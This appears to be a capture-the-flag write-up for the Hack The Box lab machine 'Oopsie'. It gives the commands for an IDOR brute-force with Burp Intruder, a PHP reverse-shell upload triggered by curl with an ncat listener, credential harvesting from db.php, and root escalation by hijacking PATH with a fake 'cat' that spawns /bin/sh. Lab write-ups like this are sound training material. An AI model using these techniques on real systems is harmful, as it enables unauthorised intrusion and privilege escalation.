# Oopsie

## Enumeration

I used nmap for enumeration to find any open ports

[nmap](Oopsie/nmap.md)

Found 2 open ports:

- 22 - usually ssh clients, 22 ports
- 80 - usually web servers, 80 ports

As it is a web server I tried to go to the website, [http://10.10.10.28](http://10.10.10.28)

Noticed in the "Services" section of the website, it says something along the lines of "login to gain access to services". So I launched **Burpsuite**, inspected the incoming network requests.

Found the URL for the login page

Tried credentials obtained from the previous machine, **Archetype**

ADMIN ACCESS GRANTED

Realised admins don't have all the privileges, so I need to become the super admin inorder to upload something to the website ( there was an Uploads section ) some shell script to let me access it's shell.

### Brute Force method!

Generated a list of integers from 1 to 100

passed them as a payload in **Burpsuite's Intruder** and started the attack!

RESULTS - 100 user records

found the result with largest amount of data

viewed it's response, found superadmin id inside the response

used to superadmin id I found in response to go to the Uploads section in website via Burpsuite forwarding.

NOW I CAN UPLOAD FILES

found a **php-reverse-shell** script on my kali machine (**locate php-reverse-shell)**

uploaded it to the website via burpsuite, it's uploaded!

**Now the file is uploaded to the server so there's a fair chance of accessing it using a GET request. So if I just do a GET request using curl I can run the php-reverse-shell!**

### Before that!

I started listening to the server at port 1234

**ncat -lvnp 1234**

NOW EXECUTED THE CURL COMMAND to send the GET request to the URL ...

time to use "dirsearch"

**git clone dirsearch**

**cd dirsearch**

**python3 [dirsearch.py](http://dirsearch.py) -u [http://10.10.10.28](http://10.10.10.28/uploads) -e php**

It just goes over the server and returns files that have anything "php" inside them.

there's a url 10.10.10.28/uploads/php-reverse-shell.php in the results!

NOW WE CAN EXECUTE THE CURL COMMAND!

**curl http://10.10.10.28/uploads/php-reverse-shell.php**

Now if I look at the terminal where we had used netcat to listen to port 1234

WE HAVE ACCESS TO THE SHELL

### Escalating privileges

SHELL=/bin/bash script -q /dev/null

stty raw -echo

we now have access to the shell

Next I looked at the records, user records

cat /var/www/html/cdn-cgi/login/db.php → just kept doing "ls" eventually found the db.php

I found a user's credentials → robert's credentials

and I found he's part of a bugtracker group, I found the bugtracker is located at /usr/bin/bugtracker

used the strings command to find something

$ strings /usr/bin/bugtracker

found that a "cat" command is being executed!

so I tried making the "cat" command malicious

### Making "cat" malicious

Adding current working dir to path

export PATH=/tmp:$PATH

cd tmp

making cat malicious

echo '/bin/sh' > cat

making it executable

chmod +x cat

to restore the default "cat"

PATH=$(getconf PATH)

just explored a bit and found root.txt and user.txt
